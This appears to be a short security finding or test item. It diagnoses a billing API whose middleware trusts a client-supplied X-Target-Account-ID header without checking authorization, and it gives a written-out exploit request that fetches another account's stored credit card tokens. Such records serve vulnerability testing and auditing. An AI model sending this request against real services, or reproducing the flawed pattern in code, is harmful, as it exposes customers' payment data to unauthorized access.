diagnosis: Middleware parses X-Target-Account-ID header and assigns it to request.state.target_account_id. The billing endpoint trusts this state without verifying that the authenticated user is an authorized signatory on that account, leaking stored credit card tokens and billing profiles across accounts.
exploit_request:
GET /api/v1/billing/stored-cards HTTP/1.1
Host: api.example.com
Authorization: Bearer <customer_jwt>
X-Target-Account-ID: acc_vault_00992384
